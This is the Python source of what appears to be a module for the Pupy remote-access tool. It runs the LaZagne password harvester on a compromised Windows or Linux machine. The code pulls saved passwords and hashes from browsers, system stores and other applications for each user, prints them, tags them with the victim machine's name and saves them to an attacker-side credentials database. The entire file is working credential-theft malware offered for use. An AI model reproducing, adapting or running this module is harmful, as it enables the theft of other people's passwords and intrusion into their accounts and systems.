# -*- coding: utf-8 -*-
# Author: AlessandroZ

from pupylib.PupyModule import *
from pupylib.PupyCompleter import *
from rpyc.utils.classic import upload
from pupylib.utils.credentials import Credentials
from pupylib.utils.term import colorize
import tempfile
import subprocess
import os.path
import sys

__class_name__="LaZagne"

@config(cat="creds", compat=["linux", "windows"])
class LaZagne(PupyModule):
    """
        retrieve passwords stored on the target
    """

    dependencies = {
        'all': [ 'sqlite3', '_sqlite3', 'xml', '_elementtree',
                     'calendar', 'xml', 'xml.etree', 'lazagne', 'colorama', 'laZagne', 'memorpy'],
        'windows': [ 'win32crypt', 'win32api', 'win32con', 'win32cred',
                         'impacket', 'win32security', 'win32net', 'pyexpat', 'gzip', 'psutil' ],
        'linux': [ 'dbus', 'secretstorage', 'crypt' ]
    }
    
    def init_argparse(self):
        header = '|====================================================================|\n'
        header += '|                                                                    |\n'
        header += '|                        The LaZagne Project                         |\n'
        header += '|                                                                    |\n'
        header += '|                          ! BANG BANG !                             |\n'
        header += '|                                                                    |\n'
        header += '|====================================================================|\n\n'

        self.arg_parser = PupyArgumentParser(prog="lazagne", description=header + self.__doc__)
        self.arg_parser.add_argument("-v", "--verbose", action='store_true')

    def run(self, args):
        if self.client.is_windows():
            self.client.load_dll('sqlite3.dll')

        db = Credentials()
        passwordsFound = False
        for r in self.client.conn.modules["laZagne"].runLaZagne():
            if r[0] == 'User':
                print colorize('\n########## User: %s ##########' % r[1].encode('utf-8', errors='replace'), "yellow")
                
            elif r[2] or args.verbose:
                self.print_module_title(r[1])

                if r[2]:
                    passwordsFound = True
                    self.print_results(r[0], r[1], r[2], db)
                elif args.verbose:
                    print '[!] no passwords found !'


        if not passwordsFound:
            self.warning("no passwords found !")

    def print_module_title(self, module):
        print colorize("\n------------------- %s passwords -------------------\n" % module.encode('utf-8', errors="replace"), "yellow")

    def print_results(self, success, module, creds, db):
        # print colorize("\n------------------- %s passwords -------------------\n" % module.encode('utf-8', errors="replace"), "yellow")
        if success:
            clean_creds = []
            for cred in creds:
                clean_cred = {}
                clean_cred['Category'] = '%s' % module
                clean_cred['uid']=self.client.short_name()
                for c in cred.keys():
                    credvalue = cred[c]
                    if not type(credvalue) in (unicode, str):
                        credvalue = str(credvalue)
                    else:
                        try:
                            credvalue = credvalue.strip().decode('utf-8')
                        except:
                            credvalue = credvalue.strip()

                    clean_cred[c] = credvalue
                    try:
                        print u'%s: %s' % (c, clean_cred[c].encode('utf-8', errors="replace"))
                    except:
                        print u'%s: %s' % (c, clean_cred[c])

                    if c == "Password":
                        clean_cred['CredType'] = 'plaintext'
                    elif c == 'Hash':
                        clean_cred['CredType'] = 'hash'
                print

                # manage when no password found
                if 'CredType' not in clean_cred:
                    clean_cred['CredType'] = 'empty'
                clean_creds.append(clean_cred)

            try:
                db.add(clean_creds)
                self.success("Passwords stored on the database")
            except Exception, e:
                print e
        else:
            # contains a stacktrace
            self.error(str(creds))
